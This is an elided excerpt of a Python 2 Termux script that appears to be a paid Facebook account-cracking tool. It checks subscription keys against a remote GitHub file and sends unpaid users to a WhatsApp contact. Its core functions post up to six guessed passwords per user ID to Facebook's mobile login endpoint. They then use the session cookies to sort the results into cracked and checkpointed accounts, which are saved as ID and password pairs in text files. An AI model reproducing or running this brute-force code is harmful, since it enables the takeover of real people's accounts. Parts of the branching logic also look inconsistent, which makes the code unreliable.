...
def main_apv():
    ...
    try:
        ...
        print '           Hi Bro This Is A Paid Command'
        print '           First Get Subcription From Owner'
        print '           Contact To Owner'
        print '           Press Enter To Get Subscription'
        print '           Text Me On Whatsapp'
        print ''
        ...
        print '           Copy Your Key And Send Me On Whatsapp'
        print ''
        print ''
        print ''
        print '     If You Have Subscription Already'
        raw_input('    Exit From Termux And Put Command Again ')
        os.system('xdg-open https://wa.me/+923441234924')

    r1 = requests.get('https://raw.githubusercontent.com/pakistani19/killer/main/Server.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
        ...
        print ''
        print ''
        print '     If You Have Already Subscription'
        raw_input('    Exit From Termux And Put Command Again ')
        os.system('xdg-open https://wa.me/+923441234924')
...
def main_input():
    ...
    if mx == '1':
        ...
        print '\x1b[1;92m        You Are Paid User '
        print '\x1b[1;91m        Lets Start '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        ...
        os.system('xdg-open https://wa.me/+923441231924')
        time.sleep(3)
        main_system()
    else:
        print 'invild option'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[Ar-OK] ' + coc + user + ' | ' + pass1
                ok = open('Ar random-ok.txt', 'a')
                ok.write(cid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(cid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[AR-CP] ' + coc + user + ' | ' + pass1
                cp = open('AR random-cp.txt', 'a')
                cp.write(cid + ' | ' + pass1 + '\n')
                cp.close()
...
def mineExt():
    ...
    print g + '[=] Extracting From AR : ' + my_line[:15]
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[AR-OK] ' + uid + ' | ' + pass1
                ok = open('AR-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[AR-CP] ' + uid + ' | ' + pass1
                cp = open('AR-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[AR-OK] ' + uid + ' | ' + pass2
                    ok = open('AR-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[AR-CP] ' + uid + ' | ' + pass2
                    cp = open('AR-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[AR-OK] ' + uid + ' | ' + pass3
                        ok = open('AR-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[AR-CP] ' + uid + ' | ' + pass3
                        cp = open('AR-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[AR-OK] ' + uid + ' | ' + pass4
                            ok = open('AR-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[AR-CP] ' + uid + ' | ' + pass4
                            cp = open('AR-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[AR-OK] ' + uid + ' | ' + pass5
                                ok = open('AR-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[AR-CP] ' + uid + ' | ' + pass5
                                cp = open('AR-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;97m[AR-CP] ' + uid + ' | ' + pass1
                cp = open('AR-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    print '\x1b[1;97m[AR-CP] ' + uid + ' | ' + pass2
                    cp = open('AR-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        print '\x1b[1;97m[AR-CP] ' + uid + ' | ' + pass3
                        cp = open('AR-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;97m[AR-CP] ' + uid + ' | ' + pass4
                            cp = open('AR-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;97m[AR-CP] ' + uid + ' | ' + pass5
                                cp = open('AR-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                    ...
                                    'login': 'submit' })
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[AR-OK] ' + uid + ' | ' + pass6
                                    ok = open('AR-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
